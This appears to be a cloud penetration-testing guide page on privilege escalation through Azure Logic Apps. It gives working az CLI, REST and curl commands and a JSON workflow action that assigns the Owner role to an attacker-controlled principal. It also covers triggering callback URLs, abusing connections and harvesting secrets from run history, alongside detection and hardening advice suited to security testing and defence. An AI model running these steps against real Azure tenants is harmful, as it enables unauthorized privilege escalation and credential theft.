---
cstg_id: CSTG-AZURE-LOGIC-APPS-PRIVESC
title: "AZURE Logic Apps - Privilege Escalation"
provider: azure
service: logic-apps
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - "One or more of the escalation-enabling permissions documented per subsection below, e.g.:"
  - Microsoft.Logic/workflows/write
  - Microsoft.Logic/workflows/triggers/listCallbackUrl/action
  - Microsoft.Logic/workflows/triggers/run/action
  - Microsoft.Logic/workflows/runs/read
  - Microsoft.Web/sites/write (Standard Logic Apps)
  - Microsoft.Web/sites/publish/action (Standard Logic Apps)
  - Microsoft.Web/connections/write
  - "Ability to obtain the workflow managed-identity token at runtime"
tools:
  - Azure CLI (az)
  - Azure PowerShell (Az.LogicApp)
  - Azure REST API
  - curl / HTTP client
  - MicroBurst
  - AzureHound / BloodHound
references:
  - "https://learn.microsoft.com/en-us/azure/logic-apps/logic-apps-overview"
  - "https://learn.microsoft.com/en-us/azure/logic-apps/authenticate-with-managed-identity"
  - "https://learn.microsoft.com/en-us/azure/logic-apps/logic-apps-securing-a-logic-app"
  - "https://learn.microsoft.com/en-us/rest/api/logic/"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments-steps"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

Logic Apps are a privilege-escalation primitive for the same structural reason as other Azure execution services: the right to *define or trigger a workflow* is distinct from, and often much wider than, the privileges of the *identity the workflow runs as* and the *connections it can use*. A workflow can request its managed identity's token from inside an action, call any Azure or Microsoft Graph endpoint that identity is authorized for, reach connected systems through pre-authorized managed connections, and read run history that frequently contains other principals' secrets.

Several escalation patterns exist:

1. **Definition write → run as the workflow identity.** An operator who can edit a workflow definition (`workflows/write`, or App Service deploy on a Standard Logic App) adds an action that authenticates with the workflow's managed identity and performs a privileged operation — granting a role, reading a Key Vault secret, writing to ARM — then triggers a run.
2. **Trigger invocation of an existing privileged workflow.** An operator who can retrieve a trigger's SAS callback URL (`triggers/listCallbackUrl/action`) or directly run a trigger (`triggers/run/action`) drives an already-built workflow that performs privileged actions, without editing it.
3. **Connection abuse.** A workflow's managed connection to Office 365, SQL, Key Vault, or storage is a pre-authorized path; driving the workflow uses that authorization to reach the connected system.
4. **Secret harvesting from run history.** Reading past run inputs/outputs yields tokens and credentials that escalate elsewhere.

The objective is to move from a foothold that can edit or trigger a workflow to control of the workflow's (often over-privileged) identity or its connected systems. This page assumes the inventory in [Logic Apps - Enumeration](../02-services/azure-logic-apps-enum.md) has identified which workflows are over-privileged or carry valuable connections.

## Prerequisites

- An assumed-breach foothold holding one or more of the escalation-enabling permissions in the subsections below, **or** possession of an HTTP-trigger callback URL (which itself requires no further Azure authentication).
- An enumeration baseline (from the enumeration page) of each workflow's managed-identity role assignments, connections, triggers, and run history.
- Azure CLI / PowerShell / REST access for control-plane operations; an HTTP client for invoking callback URLs.

## Enumeration

Refer to [Logic Apps - Enumeration](../02-services/azure-logic-apps-enum.md) for full discovery. The escalation-relevant subset:

```bash
SUB=$(az account show --query id -o tsv)

# Which workflow identities are over-privileged?
PRINCIPAL=$(az logic workflow show -g <rg> -n <workflow> --query identity.principalId -o tsv)
az role assignment list --assignee "$PRINCIPAL" --all -o table

# Retrieve the SAS callback URL of an HTTP trigger (directly invocable)
az rest --method post \
  --url "https://management.azure.com/subscriptions/$SUB/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<workflow>/triggers/<trigger>/listCallbackUrl?api-version=2019-05-01"

# Inventory connections the workflow can use
az resource list --resource-group <rg> --resource-type "Microsoft.Web/connections" -o table
```

## Misconfigurations & Findings

- A workflow's managed identity holds **Owner**, **Contributor**, **User Access Administrator**, **RBAC Administrator**, or **Key Vault** data-plane roles at a scope broader than the operator already controls.
- The operator can **edit the definition** (`workflows/write` on Consumption, or App Service deploy on Standard) of a workflow whose identity is more privileged than the operator.
- An **HTTP-trigger callback URL** is obtainable (or already leaked) and the workflow performs privileged actions, with no IP restriction in `accessControl.triggers`.
- A workflow holds a **`Connected` managed connection** to a high-value system (Office 365 mailboxes, SQL, Key Vault, storage) that the operator does not otherwise have access to.
- **Run history** contains cleartext tokens/credentials usable elsewhere (actions not marked `secureInputs`/`secureOutputs`).
- The workflow identity holds high-impact **Graph application permissions**, turning workflow control into directory escalation.

## Exploitation

Each subsection below is keyed to the specific permission that enables the path. The recurring technique is to make the workflow act with its managed identity, or to harvest data it has already touched.

### Microsoft.Logic/workflows/write (definition edit → run as identity)

The canonical Logic Apps escalation. An operator who can write the workflow definition injects an action that authenticates as the workflow's managed identity and performs a privileged operation, then triggers a run. Logic Apps natively support managed-identity authentication on `HTTP` actions via the `authentication` block with `type: ManagedServiceIdentity`, so no token-stealing code is needed:

```json
{
  "type": "Http",
  "inputs": {
    "method": "PUT",
    "uri": "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/roleAssignments/<newGuid>?api-version=2022-04-01",
    "body": {
      "properties": {
        "roleDefinitionId": "/subscriptions/<sub>/providers/Microsoft.Authorization/roleDefinitions/<owner-role-id>",
        "principalId": "<attacker-controlled-principalId>"
      }
    },
    "authentication": { "type": "ManagedServiceIdentity" }
  }
}
```

Deploy the edited definition and trigger it:

```bash
az logic workflow create -g <rg> -n <workflow> --definition @malicious-definition.json
# or update an existing one, then fire its trigger:
az rest --method post \
  --url "https://management.azure.com/subscriptions/$SUB/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<workflow>/triggers/<trigger>/run?api-version=2019-05-01"
```

If the workflow identity holds `roleAssignments/write` (Owner/UAA/RBAC Admin) the run grants the operator a high-privilege role. If it holds Key Vault data-plane access, the action can instead read secrets; if it has Graph permissions, it can call `https://graph.microsoft.com`. The action simply targets whatever the identity is authorized for.

### Microsoft.Web/sites/write and Microsoft.Web/sites/publish/action (Standard Logic Apps)

Standard Logic Apps run on an App Service plan. Deploying workflow content or app code to the host site executes under the site's managed identity, the same conversion of deploy rights into the identity's privilege seen with App Service:

```bash
# Deploy a workflow.json (or function payload) to the workflow-app site
az webapp deployment source config-zip -g <rg> -n <site> --src payload.zip
```

The deployed workflow uses `ManagedServiceIdentity` authentication exactly as above to act with the site identity's full privilege.

### Microsoft.Logic/workflows/triggers/listCallbackUrl/action and /triggers/run/action

When editing is not required because an existing workflow already performs privileged actions, an operator only needs to invoke it. `listCallbackUrl` returns a SAS-signed HTTPS endpoint that requires no further Azure authentication; `triggers/run` fires the trigger directly:

```bash
# Retrieve the callback URL, then invoke with crafted input
CB=$(az rest --method post \
  --url "https://management.azure.com/subscriptions/$SUB/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<workflow>/triggers/<trigger>/listCallbackUrl?api-version=2019-05-01" \
  --query value -o tsv)
curl -s -X POST "$CB" -H "Content-Type: application/json" -d '{"<param>":"<attacker-controlled>"}'
```

If the workflow's actions interpolate the request body into privileged operations (a parameterised storage path, a SQL query, an email recipient, or an ARM call), the caller controls those operations. A leaked callback URL from enumeration is itself sufficient — it carries the `sig` and needs no Azure role.

### Microsoft.Web/connections/write (+ workflow access) — connection abuse

A workflow's `Connected` managed connection is a pre-authorized path to its target system. With the ability to drive the workflow (edit or trigger), the operator uses the connection's authorization to read mailboxes, query databases, list/read Key Vault secrets, or read/write storage — without holding credentials for those systems directly:

```bash
# Inventory which connectors are reachable
az resource list -g <rg> --resource-type "Microsoft.Web/connections" \
  --query "[].{name:name, api:properties.api.id, status:properties.statuses[0].status}" -o table
```

Add a connector action to the definition (or invoke a workflow that already uses it) referencing the existing connection, then run it; the platform supplies the cached authorization at runtime.

### Microsoft.Logic/workflows/runs/read — secret harvesting

Run history persists action inputs and outputs in cleartext unless `secureInputs`/`secureOutputs` are set. Reading them yields credentials and tokens submitted to or returned by the workflow, which may escalate elsewhere:

```bash
# Enumerate runs and actions, then follow inputsLink/outputsLink (SAS-signed) to read payloads
az rest --method get \
  --url "https://management.azure.com/subscriptions/$SUB/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<workflow>/runs/<runId>/actions?api-version=2019-05-01"
# follow the returned inputsLink / outputsLink URIs to read cleartext input/output
```

### Workflow managed identity with Graph application permissions

If the workflow identity holds high-impact Graph app-roles (`RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`, `Application.ReadWrite.All`), an HTTP action authenticating with `ManagedServiceIdentity` against `https://graph.microsoft.com` can assign directory roles (including Global Administrator), grant app-roles, or add credentials to other applications — converting workflow control into tenant-level escalation. Build the action like the ARM example above but target the Graph endpoint and supply `resource`/audience accordingly.

## Detection & Logging

- **Azure Activity Logs** record `Microsoft.Logic/workflows/write` (definition edits — a primary escalation signal), `.../triggers/listCallbackUrl/action`, `.../triggers/run/action`, Standard `Microsoft.Web/sites/*` deployments, `Microsoft.Web/connections/write`, and any privileged downstream operation performed by the identity such as `Microsoft.Authorization/roleAssignments/write`. Alert on a workflow edit or trigger run that is closely followed by a high-impact role assignment, especially to the workflow's own identity or a newly created principal.
- **Entra ID audit logs** record directory changes the identity may make (directory role membership, app-role grants, `addPassword`/`addKey`) — high-fidelity tenant-takeover signals — and attribute them to the workflow's service principal.
- **Entra ID sign-in logs** show the workflow managed identity acquiring tokens for `https://management.azure.com/`, `https://vault.azure.net`, and `https://graph.microsoft.com/`; a Logic Apps identity suddenly calling privileged ARM or Graph endpoints is anomalous.
- Logic Apps runtime/diagnostic logs (when routed to Log Analytics) record trigger invocations and action execution, including external callback-URL invocations; correlate trigger runs with their source IP.
- **Microsoft Defender for Cloud** alerts on suspicious role assignments and identity abuse; **Entra Permissions Management** flags privilege creep on the workflow identity.

## Remediation & Hardening

- Apply least privilege to each workflow's managed identity; never assign Owner, Contributor, User Access Administrator, RBAC Administrator, or broad Key Vault/Graph permissions unless strictly required, and scope tightly.
- Treat `Microsoft.Logic/workflows/write` and Standard App Service deploy rights as equivalent to the workflow identity's full power; restrict who holds them.
- Restrict HTTP triggers with `accessControl.triggers.allowedCallerIpAddresses`, prefer Entra-authenticated triggers over open SAS callback URLs, and regenerate trigger access keys after exposure.
- Set `accessControl.actions` and `accessControl.contents` to limit who can edit actions and read run-history payloads; mark secret-handling actions `secureInputs`/`secureOutputs`.
- Scope and audit managed connections; remove unused `Connected` connections, and prefer managed-identity-based connections that can be revoked centrally over stored credentials.
- Constrain identity `roleAssignments/write` with `roleAssignmentConditions` so a workflow identity cannot grant arbitrary roles, and use Azure Policy to deny high-risk role assignments to managed identities.
- Route Activity Logs, Entra logs, and Logic Apps diagnostics to a SIEM and alert on the operations listed above.

## Tools

- **Azure CLI (az)** / **Azure REST API** — definition edit/create, `listCallbackUrl`, trigger run, role assignment, connection inventory.
- **Azure PowerShell (Az.LogicApp)** — `Set-AzLogicApp`, `Start-AzLogicApp`, `Get-AzLogicAppTriggerCallbackUrl`, `Get-AzLogicAppRunHistory`.
- **curl / HTTP client** — invoking SAS-signed callback URLs and following run input/output links.
- **MicroBurst** — Azure attack tooling for resource enumeration and secret hunting across definitions and run history.
- **AzureHound / BloodHound** — graph the shortest path from a foothold to a privileged workflow identity or connected system.

## References

- Logic Apps overview — https://learn.microsoft.com/en-us/azure/logic-apps/logic-apps-overview
- Authenticate Logic Apps with a managed identity — https://learn.microsoft.com/en-us/azure/logic-apps/authenticate-with-managed-identity
- Securing a Logic App — https://learn.microsoft.com/en-us/azure/logic-apps/logic-apps-securing-a-logic-app
- Logic Apps REST API — https://learn.microsoft.com/en-us/rest/api/logic/
- Steps to assign an Azure role — https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments-steps
- hackingthe.cloud Azure section — https://hackingthe.cloud/azure/
